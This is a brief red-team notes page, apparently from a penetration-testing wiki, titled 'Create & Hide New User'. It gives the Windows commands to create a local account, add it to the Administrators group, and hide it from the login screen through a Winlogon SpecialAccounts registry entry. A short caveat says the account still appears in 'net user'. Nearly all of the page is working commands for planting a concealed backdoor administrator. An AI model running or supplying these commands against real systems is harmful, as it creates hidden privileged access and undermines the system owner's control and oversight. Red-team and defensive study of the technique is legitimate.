# Create & Hide New User

Creating User and Adding to Local Administrators

```
net user spotless spotless /add & net localgroup Administrators spotless /add
```

Hide Newly Created Local administrator

{% hint style="danger" %}
This will only hide the username from winlogon screen (windows login GUI screen),  but the user can be detected with <mark style="color:green;">`net user`</mark>` ``` command
{% endhint %}

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v spotless /d 0 /f
```
